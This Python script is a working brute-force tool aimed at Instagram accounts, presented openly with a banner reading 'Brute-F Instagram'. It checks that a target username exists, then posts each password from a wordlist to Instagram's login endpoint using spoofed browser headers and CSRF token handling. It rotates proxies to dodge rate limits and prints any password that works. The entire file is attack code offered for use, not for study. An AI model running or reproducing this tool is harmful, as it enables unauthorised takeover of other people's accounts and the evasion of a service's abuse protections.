import requests
import json
import time
import os
import random
import sys

os.system('clear')
os.system("figlet -f pagga ' Brute-F ' | lolcat")
os.system("figlet -f pagga '      Instagram      ' | lolcat")

# Help function
def Input(text):
    value = ''
    if sys.version_info.major > 2:
        value = input(text)
    else:
        value = raw_input(text)
    return str(value)

# The main class
class Instabrute():
    def __init__(self, username, passwordsFile='pass.txt'):
        self.username = username
        self.CurrentProxy = ''
        self.UsedProxys = []
        self.passwordsFile = passwordsFile

        # Check if passwords file exists
        self.loadPasswords()
        # Check if username exists
        self.IsUserExists()

        UsePorxy = Input('[*] Do you want to use proxy (y/n): ').upper()
        if (UsePorxy == 'Y' or UsePorxy == 'YES'):
            self.randomProxy()

    # Check if password file exists and check if it contains passwords
    def loadPasswords(self):
        if os.path.isfile(self.passwordsFile):
            with open(self.passwordsFile) as f:
                self.passwords = f.read().splitlines()
                passwordsNumber = len(self.passwords)
                if (passwordsNumber > 0):
                    print ('[*] %s Passwords loaded successfully' % passwordsNumber)
                else:
                    print('Password file is empty, Please add passwords to it.')
                    Input('[*] Press enter to exit')
                    exit()
        else:
            print ('Please create a password file named "%s"' % self.passwordsFile)
            Input('[*] Press enter to exit')
            exit()

    # Choose random proxy from proxy file
    def randomProxy(self):
        plist = open('proxy.txt').read().splitlines()
        proxy = random.choice(plist)

        if proxy not in self.UsedProxys:
            self.CurrentProxy = proxy
            self.UsedProxys.append(proxy)
        try:
            print('')
            print('[*] Check new IP...')
            print ('[*] Your public IP: %s' % requests.get('http://myexternalip.com/raw', proxies={ "http": proxy, "https": proxy },timeout=10.0).text)
        except Exception as e:
            print  ('[*] Can\'t reach proxy "%s"' % proxy)
        print('')

    # Check if username exists in Instagram server
    def IsUserExists(self):
        r = requests.get('https://www.instagram.com/%s/?__a=1' % self.username) 
        if (r.status_code == 404):
            print ('[*] User named "%s" not found' % self.username)
            Input('[*] Press enter to exit')
            exit()
        elif (r.status_code == 200):
            return True

    # Try to login with password
    def Login(self, password):
        sess = requests.Session()

        if len(self.CurrentProxy) > 0:
            sess.proxies = { "http": self.CurrentProxy, "https": self.CurrentProxy }

        # Build request headers
        sess.cookies.update({'sessionid' : '', 'mid' : '', 'ig_pr' : '1', 'ig_vw' : '1920', 'csrftoken' : '',  's_network' : '', 'ds_user_id' : ''})
        sess.headers.update({
            'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36',
            'x-instagram-ajax':'1',
            'X-Requested-With': 'XMLHttpRequest',
            'origin': 'https://www.instagram.com',
            'Content-Type' : 'application/x-www-form-urlencoded',
            'Connection': 'keep-alive',
            'Accept': '*/*',
            'Referer': 'https://www.instagram.com',
            'authority': 'www.instagram.com',
            'Host' : 'www.instagram.com',
            'Accept-Language' : 'en-US;q=0.6,en;q=0.4',
            'Accept-Encoding' : 'gzip, deflate'
        })

        # Update token after entering the site
        r = sess.get('https://www.instagram.com/') 
        cookies_dict = r.cookies.get_dict()

        # Check if csrf token exists
        if 'csrftoken' in cookies_dict:
            sess.headers.update({'X-CSRFToken': cookies_dict['csrftoken']})
        else:
            print("CSRF token not found. Skipping login.")
            return False

        # Update token after login to the site
        r = sess.post('https://www.instagram.com/accounts/login/ajax/', data={'username':self.username, 'password':password}, allow_redirects=True)
        cookies_dict = r.cookies.get_dict()
        
        # Check if csrf token is available after login
        if 'csrftoken' in cookies_dict:
            sess.headers.update({'X-CSRFToken': cookies_dict['csrftoken']})
        else:
            print("CSRF token not found after login.")
            return False

        # Parse response
        data = json.loads(r.text)
        if data.get('status') == 'fail':
            print (data['message'])

            UseProxy = Input('[*] Do you want to use proxy (y/n): ').upper()
            if (UseProxy == 'Y' or UseProxy == 'YES'):
                print ('[$] Trying to use proxy after fail.')
                self.randomProxy()  # Check that, may contain bugs
            return False

        # Return session if password is correct 
        if data.get('authenticated') == True:
            return sess 
        else:
            return False

instabrute = Instabrute(Input('Please enter a username: '))

try:
    delayLoop = int(Input('[*] Please add delay between the brute-force action (in seconds): ')) 
except Exception as e:
    print ('[*] Error, software using the default value "4"')
    delayLoop = 4
print ('')

for password in instabrute.passwords:
    sess = instabrute.Login(password)
    if sess:
        os.system("echo -n '[+] Login success ' | pv -qL 5 | lolcat")
        print (': %s' % [instabrute.username, password])
        break
    else:
        print ('[-] Password incorrect [%s]' % password)

    try:
        time.sleep(delayLoop)
    except KeyboardInterrupt:
        WantToExit = str(Input('Type y/n to exit: ')).upper()
        if (WantToExit == 'Y' or WantToExit == 'YES'):
            exit()
        else:
            continue
